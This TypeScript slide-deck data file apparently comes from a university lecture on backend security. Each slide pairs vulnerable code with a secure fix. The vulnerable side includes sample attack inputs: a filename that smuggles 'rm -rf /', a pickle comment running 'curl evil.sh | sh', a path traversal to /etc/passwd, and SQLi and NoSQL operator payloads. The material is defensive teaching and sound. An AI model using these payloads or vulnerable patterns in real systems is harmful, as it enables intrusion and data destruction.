import type { Slide } from "./types";

export const slides: Slide[] = [
  // ── 1. Title ──────────────────────────────────────────────────────────
  {
    kind: "title",
    title: "Backend Security Engineering in Depth",
    subtitle: "What goes wrong, why, and how to defend — in 60 minutes",
    tags: ["auth", "injection", "secrets", "infra", "APIs"],
    footer: "Astana IT University · 2026",
  },

  // ── 2. Threat model ───────────────────────────────────────────────────
  {
    kind: "content",
    accent: "neutral",
    icon: "!",
    title: "What we're defending against",
    blocks: [
      {
        kind: "lead",
        text: "Most breaches are not zero-days. They are checklists: forgotten flags, missing checks, leaked secrets. The cost is rising and detection is slow.",
      },
      {
        kind: "cards",
        columns: 3,
        items: [
          {
            title: "AVG BREACH COST",
            accent: "red",
            body: "$4.88M global average per incident (IBM, 2024). Larger for regulated industries.",
          },
          {
            title: "MTTD + MTTR",
            accent: "amber",
            body: "277 days median to identify and contain a breach. You ship faster than you detect.",
          },
          {
            title: "ROOT CAUSE",
            accent: "blue",
            body: "82% involve a human or config error: stolen creds, exposed buckets, missing patch.",
          },
        ],
      },
      {
        kind: "bullets",
        items: [
          "Recon: find endpoints, parameters, error messages, leaked tokens on GitHub.",
          "Foothold: SQLi, weak auth, exposed admin panel, dependency CVE.",
          "Pivot: SSRF to metadata service, IDOR to other tenants, JWT forgery.",
          "Exfiltrate: dump DB, S3, logs — anything with PII or secrets.",
        ],
      },
    ],
  },

  // ── 3. Section 01 ─────────────────────────────────────────────────────
  {
    kind: "divider",
    number: "01",
    name: "Authentication & Authorization",
    description: "Who are you, and what are you allowed to do?",
    accent: "blue",
  },

  // ── 4. Password hashing ───────────────────────────────────────────────
  {
    kind: "content",
    accent: "blue",
    icon: "#",
    title: "Storing passwords",
    blocks: [
      {
        kind: "lead",
        text: "Passwords are not encrypted. They are hashed with a slow, salted, memory-hard function. MD5, SHA-1, even plain SHA-256 are wrong.",
      },
      {
        kind: "code-compare",
        bad: {
          label: "❌ VULNERABLE",
          tone: "bad",
          lang: "python",
          code: `import hashlib

def hash_password(pw: str) -> str:
    # Fast hash → GPU cracks 10B/sec.
    # No salt → rainbow tables.
    return hashlib.md5(pw.encode()).hexdigest()

def verify(pw: str, stored: str) -> bool:
    return hash_password(pw) == stored`,
        },
        good: {
          label: "✓ SECURE",
          tone: "good",
          lang: "python",
          code: `from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

ph = PasswordHasher(
    time_cost=3, memory_cost=64_000, parallelism=4
)

def hash_password(pw: str) -> str:
    return ph.hash(pw)   # salt embedded

def verify(pw: str, stored: str) -> bool:
    try: return ph.verify(stored, pw)
    except VerifyMismatchError: return False`,
        },
      },
      {
        kind: "tip",
        title: "Pick one",
        body: "Argon2id (winner of PHC, OWASP default), bcrypt (cost ≥ 12), or scrypt. Never roll your own. Re-hash on login if parameters change.",
      },
    ],
  },

  // ── 5. JWT attacks ────────────────────────────────────────────────────
  {
    kind: "content",
    accent: "blue",
    icon: "{}",
    title: "JWT: three common forgeries",
    blocks: [
      {
        kind: "cards",
        columns: 3,
        items: [
          {
            title: "ALG: NONE",
            accent: "red",
            body: "Library accepts unsigned tokens. Attacker sets header alg to 'none', strips signature, rewrites payload.",
          },
          {
            title: "ALG CONFUSION",
            accent: "red",
            body: "Switch RS256 → HS256. Server verifies with the public key as the HMAC secret. Public key is, well, public.",
          },
          {
            title: "WEAK SECRET",
            accent: "red",
            body: "HS256 with 'secret', 'changeme', or 8 ASCII chars. hashcat cracks in seconds.",
          },
        ],
      },
      {
        kind: "code-compare",
        demoId: "jwt",
        bad: {
          label: "❌ VULNERABLE",
          tone: "bad",
          lang: "js",
          code: `import jwt from "jsonwebtoken";

// Accepts any algorithm — including "none".
// Secret loaded from a default.
const SECRET = process.env.JWT_SECRET || "dev";

export function verify(token) {
  return jwt.verify(token, SECRET);
}`,
        },
        good: {
          label: "✓ SECURE",
          tone: "good",
          lang: "js",
          code: `import jwt from "jsonwebtoken";

if (!process.env.JWT_SECRET) throw new Error("JWT_SECRET missing");
const SECRET = process.env.JWT_SECRET; // ≥ 32 bytes random

export function verify(token) {
  return jwt.verify(token, SECRET, {
    algorithms: ["HS256"],       // pin alg
    issuer: "api.example.com",
    audience: "web",
    maxAge: "15m",
  });
}`,
        },
      },
    ],
  },

  // ── 6. Session security ───────────────────────────────────────────────
  {
    kind: "content",
    accent: "blue",
    icon: "S",
    title: "Session cookies",
    blocks: [
      {
        kind: "code-compare",
        bad: {
          label: "❌ VULNERABLE",
          tone: "bad",
          lang: "js",
          code: `// XSS reads it. CSRF rides it.
res.cookie("sid", sessionId, {
  // no httpOnly  → JS can read
  // no secure    → sent over http
  // no sameSite  → CSRF
  maxAge: 30 * 24 * 60 * 60 * 1000,
});`,
        },
        good: {
          label: "✓ SECURE",
          tone: "good",
          lang: "js",
          code: `res.cookie("sid", sessionId, {
  httpOnly: true,        // no JS access
  secure: true,          // https only
  sameSite: "lax",       // CSRF defense
  path: "/",
  maxAge: 30 * 24 * 60 * 60 * 1000,
  // Rotate session id on login → kills fixation.
});

// On login:
await req.session.regenerate();`,
        },
      },
      {
        kind: "warning",
        title: "Session fixation",
        body: "If the session id does not change at the moment of login, an attacker who set it pre-login is now logged in too. Regenerate on every privilege change.",
      },
    ],
  },

  // ── 7. RBAC / ABAC / IDOR ─────────────────────────────────────────────
  {
    kind: "content",
    accent: "blue",
    icon: "%",
    title: "Authorization: ownership matters",
    blocks: [
      {
        kind: "lead",
        text: "Authentication tells you who. Authorization tells you whether they may. IDOR is the gap between the two — and the most common API bug.",
      },
      {
        kind: "code-compare",
        demoId: "idor",
        bad: {
          label: "❌ IDOR",
          tone: "bad",
          lang: "ts",
          code: `// GET /api/invoices/:id
app.get("/api/invoices/:id", auth, async (req, res) => {
  const inv = await db.invoice.findById(req.params.id);
  // No ownership check.
  // Anyone logged in can read any invoice.
  res.json(inv);
});`,
        },
        good: {
          label: "✓ OWNERSHIP CHECK",
          tone: "good",
          lang: "ts",
          code: `app.get("/api/invoices/:id", auth, async (req, res) => {
  const inv = await db.invoice.findOne({
    _id: req.params.id,
    ownerId: req.user.id,   // ← the whole game
  });
  if (!inv) return res.status(404).end();
  // Return 404 (not 403): don't leak existence.
  res.json(inv);
});`,
        },
      },
      {
        kind: "tip",
        title: "RBAC vs ABAC",
        body: "RBAC: roles → permissions (admin can delete). ABAC: attributes → policy (user can delete if owner AND not archived AND within retention). Most real apps need both.",
      },
    ],
  },

  // ── 8. Section 02 ─────────────────────────────────────────────────────
  {
    kind: "divider",
    number: "02",
    name: "Injection Attacks",
    description: "Untrusted input crossing a parser boundary.",
    accent: "red",
  },

  // ── 9. SQL injection ──────────────────────────────────────────────────
  {
    kind: "content",
    accent: "red",
    icon: ">_",
    title: "SQL injection — still #1",
    blocks: [
      {
        kind: "lead",
        text: "Any user input concatenated into a query is a vulnerability. Union-based reads data. Blind/time-based extracts it byte by byte.",
      },
      {
        kind: "code-compare",
        demoId: "sqli",
        bad: {
          label: "❌ VULNERABLE",
          tone: "bad",
          lang: "python",
          code: `def login(email, password):
    # ' OR '1'='1  →  always true
    q = f"""
        SELECT id FROM users
        WHERE email = '{email}'
          AND password = '{password}'
    """
    return db.execute(q).fetchone()`,
        },
        good: {
          label: "✓ PARAMETERIZED",
          tone: "good",
          lang: "python",
          code: `def login(email, password):
    # Driver sends query + params separately.
    # Input is never parsed as SQL.
    row = db.execute(
        "SELECT id, password_hash FROM users "
        "WHERE email = %s",
        (email,),
    ).fetchone()
    if not row: return None
    return row if verify(password, row.password_hash) else None`,
        },
      },
      {
        kind: "warning",
        title: "ORMs are not a free pass",
        body: "Raw query escape hatches (.raw(), $queryRaw, Sequelize.literal) take strings. Same risk. And don't trust 'escaping' libraries — use bind parameters.",
      },
    ],
  },

  // ── 10. NoSQL + command injection ─────────────────────────────────────
  {
    kind: "content",
    accent: "red",
    icon: "$",
    title: "NoSQL & command injection",
    blocks: [
      {
        kind: "code-compare",
        bad: {
          label: "❌ NoSQL OPERATOR INJECTION",
          tone: "bad",
          lang: "js",
          code: `// Body: { "email": "a@b.c", "password": { "$gt": "" } }
// → matches any user.
app.post("/login", async (req, res) => {
  const user = await User.findOne({
    email: req.body.email,
    password: req.body.password,
  });
  if (user) return res.json({ token: sign(user) });
});`,
        },
        good: {
          label: "✓ COERCE + HASH",
          tone: "good",
          lang: "js",
          code: `app.post("/login", async (req, res) => {
  const email = String(req.body.email);
  const password = String(req.body.password);
  const user = await User.findOne({ email });
  if (!user) return res.status(401).end();
  if (!(await argon2.verify(user.hash, password)))
    return res.status(401).end();
  res.json({ token: sign(user) });
});`,
        },
      },
      {
        kind: "code-compare",
        bad: {
          label: "❌ SHELL=TRUE",
          tone: "bad",
          lang: "python",
          code: `# filename = "a.png; rm -rf /"
subprocess.run(
    f"convert {filename} thumb.png",
    shell=True,
)`,
        },
        good: {
          label: "✓ NO SHELL",
          tone: "good",
          lang: "python",
          code: `# argv list → no shell parsing.
subprocess.run(
    ["convert", filename, "thumb.png"],
    check=True, timeout=10,
)
# Plus: validate filename against allowlist.`,
        },
      },
    ],
  },

  // ── 11. Path traversal & SSRF ─────────────────────────────────────────
  {
    kind: "content",
    accent: "red",
    icon: "/",
    title: "Path traversal & SSRF",
    blocks: [
      {
        kind: "code-compare",
        bad: {
          label: "❌ PATH TRAVERSAL",
          tone: "bad",
          lang: "js",
          code: `// GET /files?name=../../../etc/passwd
app.get("/files", (req, res) => {
  const p = path.join("/var/app/uploads", req.query.name);
  res.sendFile(p);
});`,
        },
        good: {
          label: "✓ CONTAIN + VERIFY",
          tone: "good",
          lang: "js",
          code: `const BASE = path.resolve("/var/app/uploads");

app.get("/files", (req, res) => {
  const name = path.basename(String(req.query.name));
  const full = path.resolve(BASE, name);
  if (!full.startsWith(BASE + path.sep))
    return res.status(400).end();
  res.sendFile(full);
});`,
        },
      },
      {
        kind: "warning",
        title: "SSRF: don't fetch what the user gave you",
        body: "Block 127.0.0.0/8, 10/8, 172.16/12, 192.168/16, 169.254/16 (cloud metadata), ::1. Resolve DNS yourself and check the IP — not the hostname. DNS rebinding is real.",
      },
    ],
  },

  // ── 12. Section 03 ────────────────────────────────────────────────────
  {
    kind: "divider",
    number: "03",
    name: "Data Protection & Secrets",
    description: "What you store, where the keys live.",
    accent: "green",
  },

  // ── 13. Secrets management ────────────────────────────────────────────
  {
    kind: "content",
    accent: "green",
    icon: "K",
    title: "Where secrets live",
    blocks: [
      {
        kind: "cards",
        columns: 3,
        items: [
          {
            title: "❌ HARDCODED",
            accent: "red",
            body: "Pasted in source. Lives forever in git history. Indexed by GitHub search and bots within minutes of pushing.",
          },
          {
            title: "△ .ENV FILE",
            accent: "amber",
            body: "Out of source — good. But still plaintext, copied to every dev laptop, often committed by accident.",
          },
          {
            title: "✓ VAULT / KMS",
            accent: "green",
            body: "Short-lived, rotated, audited. Apps fetch at boot. Access is per-identity, not per-file.",
          },
        ],
      },
      {
        kind: "code-compare",
        bad: {
          label: "❌ COMMITTED",
          tone: "bad",
          lang: "python",
          code: `STRIPE_KEY = "sk_live_51HabcXYZ..."   # in main.py
DB_URL     = "postgres://app:hunter2@prod-db/app"

# Pushed once → key compromised forever.`,
        },
        good: {
          label: "✓ FETCHED + ROTATED",
          tone: "good",
          lang: "python",
          code: `import os, boto3

def load_secret(name: str) -> str:
    client = boto3.client("secretsmanager")
    return client.get_secret_value(SecretId=name)["SecretString"]

STRIPE_KEY = load_secret(f"{os.environ['ENV']}/stripe/key")
# Rotated by AWS on a schedule. App re-reads on SIGHUP.`,
        },
      },
    ],
  },

  // ── 14. Encryption ────────────────────────────────────────────────────
  {
    kind: "content",
    accent: "green",
    icon: "E",
    title: "Encryption at rest & in transit",
    blocks: [
      {
        kind: "code-compare",
        bad: {
          label: "❌ PLAINTEXT FIELD",
          tone: "bad",
          lang: "python",
          code: `# SSN stored as plain text.
# Any DB dump = full disclosure.
user.ssn = "123-45-6789"
session.commit()`,
        },
        good: {
          label: "✓ FIELD ENCRYPTION",
          tone: "good",
          lang: "python",
          code: `from cryptography.fernet import Fernet
fernet = Fernet(load_secret("ssn/key"))  # 32-byte key

def put_ssn(user, ssn: str):
    user.ssn_enc = fernet.encrypt(ssn.encode())

def get_ssn(user) -> str:
    return fernet.decrypt(user.ssn_enc).decode()
# Key in KMS, rotated. DB dump alone is useless.`,
        },
      },
      {
        kind: "code",
        block: {
          label: "TLS — nginx",
          tone: "neutral",
          lang: "nginx",
          code: `server {
  listen 443 ssl http2;
  ssl_certificate     /etc/letsencrypt/live/api/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/api/privkey.pem;
  ssl_protocols       TLSv1.2 TLSv1.3;          # no SSLv3, no TLS 1.0/1.1
  ssl_ciphers         HIGH:!aNULL:!MD5;
  add_header Strict-Transport-Security
    "max-age=63072000; includeSubDomains; preload" always;
}`,
        },
      },
    ],
  },

  // ── 15. Section 04 ────────────────────────────────────────────────────
  {
    kind: "divider",
    number: "04",
    name: "Infrastructure & API Security",
    description: "Rate limits, headers, and the supply chain.",
    accent: "purple",
  },

  // ── 16. Rate limiting + timing attacks ────────────────────────────────
  {
    kind: "content",
    accent: "purple",
    icon: "~",
    title: "Rate limits & timing attacks",
    blocks: [
      {
        kind: "code",
        block: {
          label: "express-rate-limit",
          tone: "good",
          lang: "js",
          code: `import rateLimit from "express-rate-limit";

// Per-IP + per-route. Stricter on auth.
app.use("/api", rateLimit({
  windowMs: 60_000, max: 120, standardHeaders: true,
}));
app.use("/api/login", rateLimit({
  windowMs: 60_000, max: 5,
  // Use a distributed store (Redis) behind a load balancer.
  // And keyGenerator: by user/email, not just IP.
}));`,
        },
      },
      {
        kind: "code-compare",
        demoId: "timing",
        bad: {
          label: "❌ TIMING LEAK",
          tone: "bad",
          lang: "js",
          code: `// '==' returns early at first mismatch.
// Attacker measures response time to recover token byte by byte.
if (req.headers["x-api-token"] === expected) {
  return next();
}`,
        },
        good: {
          label: "✓ CONSTANT-TIME",
          tone: "good",
          lang: "js",
          code: `import { timingSafeEqual } from "node:crypto";

const a = Buffer.from(req.headers["x-api-token"] ?? "", "utf8");
const b = Buffer.from(expected, "utf8");
if (a.length !== b.length) return res.status(401).end();
if (!timingSafeEqual(a, b))  return res.status(401).end();
return next();`,
        },
      },
    ],
  },

  // ── 17. CORS & headers ────────────────────────────────────────────────
  {
    kind: "content",
    accent: "purple",
    icon: "H",
    title: "CORS & security headers",
    blocks: [
      {
        kind: "code-compare",
        bad: {
          label: "❌ WILDCARD WITH CREDENTIALS",
          tone: "bad",
          lang: "js",
          code: `// Browser blocks this combo, but the intent is wrong:
// trying to allow "any origin" with cookies.
app.use(cors({
  origin: "*",
  credentials: true,
}));
// Or worse: reflect the Origin header.
app.use(cors({ origin: (o, cb) => cb(null, o) }));`,
        },
        good: {
          label: "✓ ALLOWLIST + HEADERS",
          tone: "good",
          lang: "js",
          code: `import helmet from "helmet";

app.use(helmet());           // CSP, HSTS, X-Frame, X-Content-Type
app.use(cors({
  origin: ["https://app.example.com", "https://admin.example.com"],
  credentials: true,
  methods: ["GET", "POST", "PATCH", "DELETE"],
  allowedHeaders: ["Authorization", "Content-Type"],
}));`,
        },
      },
      {
        kind: "tip",
        title: "Required headers",
        body: "Strict-Transport-Security, Content-Security-Policy, X-Content-Type-Options: nosniff, Referrer-Policy: no-referrer, Permissions-Policy. helmet sets sane defaults — then tighten CSP.",
      },
    ],
  },

  // ── 18. Dependency CVEs ───────────────────────────────────────────────
  {
    kind: "content",
    accent: "purple",
    icon: "P",
    title: "Your supply chain is in your lockfile",
    blocks: [
      {
        kind: "lead",
        text: "Your code is small. Your dependencies are not. Most production CVEs in 2024 sat in transitive deps no one read.",
      },
      {
        kind: "code",
        block: {
          label: "Audit in CI — GitHub Actions",
          tone: "good",
          lang: "yaml",
          code: `name: security
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v4
      - run: pnpm install --frozen-lockfile
      - run: pnpm audit --audit-level=high   # fail on high+
      - uses: aquasecurity/trivy-action@master
        with: { scan-type: fs, severity: HIGH,CRITICAL, exit-code: 1 }`,
        },
      },
      {
        kind: "cards",
        columns: 2,
        items: [
          {
            title: "ECOSYSTEM TOOLS",
            accent: "purple",
            bullets: [
              "pnpm audit / npm audit / yarn audit",
              "pip-audit, safety",
              "cargo audit, govulncheck",
              "Dependabot, Renovate — automate PRs",
            ],
          },
          {
            title: "POLICY",
            accent: "purple",
            bullets: [
              "Pin versions; commit the lockfile.",
              "Fail builds on high/critical.",
              "Review new direct deps like new employees.",
              "Mirror critical deps; have a fork plan.",
            ],
          },
        ],
      },
    ],
  },

  // ── 19. Section 05 ────────────────────────────────────────────────────
  {
    kind: "divider",
    number: "05",
    name: "Advanced Topics",
    description: "The ones that take down billion-dollar companies.",
    accent: "amber",
  },

  // ── 20. Mass assignment ───────────────────────────────────────────────
  {
    kind: "content",
    accent: "amber",
    icon: "M",
    title: "Mass assignment",
    blocks: [
      {
        kind: "lead",
        text: "GitHub, 2012: Egor Homakov added himself as a Rails contributor by posting an extra parameter. The framework auto-bound every field on the model.",
      },
      {
        kind: "code-compare",
        demoId: "mass-assignment",
        bad: {
          label: "❌ AUTO-BIND EVERYTHING",
          tone: "bad",
          lang: "ts",
          code: `// PATCH /users/me   body: { name: "...", isAdmin: true }
app.patch("/users/me", auth, async (req, res) => {
  const updated = await User.update(req.user.id, req.body);
  res.json(updated);
});`,
        },
        good: {
          label: "✓ ALLOWLIST",
          tone: "good",
          lang: "ts",
          code: `import { z } from "zod";

const PatchMe = z.object({
  name: z.string().min(1).max(80),
  avatarUrl: z.string().url().optional(),
}).strict();   // unknown keys → reject

app.patch("/users/me", auth, async (req, res) => {
  const data = PatchMe.parse(req.body);
  const updated = await User.update(req.user.id, data);
  res.json(updated);
});`,
        },
      },
    ],
  },

  // ── 21. Deserialization ───────────────────────────────────────────────
  {
    kind: "content",
    accent: "amber",
    icon: "D",
    title: "Insecure deserialization",
    blocks: [
      {
        kind: "lead",
        text: "Any format that can rebuild arbitrary objects (pickle, Java serialization, PHP unserialize, YAML safe_load=False) is a remote code execution primitive when fed attacker input.",
      },
      {
        kind: "code-compare",
        bad: {
          label: "❌ pickle.loads(user_input)",
          tone: "bad",
          lang: "python",
          code: `# Session cookie payload, deserialized server-side.
data = pickle.loads(base64.b64decode(cookie))
# Attacker crafts a payload whose __reduce__ runs:
#   os.system("curl evil.sh | sh")
# Instant RCE.`,
        },
        good: {
          label: "✓ JSON + HMAC",
          tone: "good",
          lang: "python",
          code: `import json, hmac, hashlib, base64

def sign(payload: dict) -> str:
    body = json.dumps(payload, sort_keys=True).encode()
    sig = hmac.new(SECRET, body, hashlib.sha256).digest()
    return base64.urlsafe_b64encode(body + b"." + sig).decode()

def verify(token: str) -> dict:
    raw = base64.urlsafe_b64decode(token)
    body, sig = raw.rsplit(b".", 1)
    expected = hmac.new(SECRET, body, hashlib.sha256).digest()
    if not hmac.compare_digest(sig, expected): raise ValueError
    return json.loads(body)`,
        },
      },
    ],
  },

  // ── 22. Logging & errors ──────────────────────────────────────────────
  {
    kind: "content",
    accent: "amber",
    icon: "L",
    title: "Observability without leaks",
    blocks: [
      {
        kind: "cards",
        columns: 2,
        items: [
          {
            title: "✓ DO LOG",
            accent: "green",
            bullets: [
              "Request id, user id, route, status, latency",
              "Auth events: login, logout, failure, lockout",
              "Authz denials with subject + resource",
              "Admin actions and config changes",
            ],
          },
          {
            title: "❌ NEVER LOG",
            accent: "red",
            bullets: [
              "Passwords, tokens, session ids, API keys",
              "Full credit cards, CVVs, raw SSNs",
              "Request/response bodies for sensitive routes",
              "Stack traces in production responses",
            ],
          },
        ],
      },
      {
        kind: "code-compare",
        bad: {
          label: "❌ STACK TO CLIENT",
          tone: "bad",
          lang: "js",
          code: `app.use((err, req, res, next) => {
  // Leaks file paths, queries, secrets in error messages.
  res.status(500).send(err.stack);
});`,
        },
        good: {
          label: "✓ SAFE HANDLER",
          tone: "good",
          lang: "js",
          code: `app.use((err, req, res, next) => {
  const id = req.id ?? crypto.randomUUID();
  log.error({ id, route: req.path, err }, "unhandled");
  // Generic message + correlation id.
  res.status(500).json({
    error: "internal_error",
    requestId: id,
  });
});`,
        },
      },
    ],
  },

  // ── 23. Close ─────────────────────────────────────────────────────────
  {
    kind: "content",
    accent: "neutral",
    icon: "✓",
    title: "10 non-negotiables",
    blocks: [
      {
        kind: "bullets",
        items: [
          "Hash passwords with Argon2id / bcrypt(≥12). Never reversible.",
          "Pin JWT algs. Rotate signing keys. Short expiry + refresh.",
          "HttpOnly, Secure, SameSite=Lax cookies. Regenerate session on login.",
          "Authorize on every request. Check ownership server-side. Default-deny.",
          "Parameterize every query. Treat user input as data, never as code.",
          "Secrets in a vault. Never in git. Rotate. Audit access.",
          "TLS 1.2+ everywhere. HSTS preload. Encrypt sensitive fields.",
          "Rate-limit auth & write endpoints. Use constant-time compares.",
          "Allowlist CORS origins. helmet for headers. Strict CSP.",
          "Audit dependencies in CI. Fail builds on high/critical CVEs.",
        ],
      },
      {
        kind: "tip",
        title: "Keep reading",
        links: [
          { label: "OWASP Top 10", url: "https://owasp.org/Top10/" },
          {
            label: "OWASP ASVS",
            url: "https://owasp.org/www-project-application-security-verification-standard/",
          },
          { label: "OWASP Cheat Sheets", url: "https://cheatsheetseries.owasp.org/" },
          {
            label: "PortSwigger Web Security Academy",
            url: "https://portswigger.net/web-security",
          },
          {
            label: "Google Project Zero",
            url: "https://googleprojectzero.blogspot.com/",
          },
          {
            label: "GitHub Advisory Database",
            url: "https://github.com/advisories",
          },
        ],
      },
    ],
  },
];
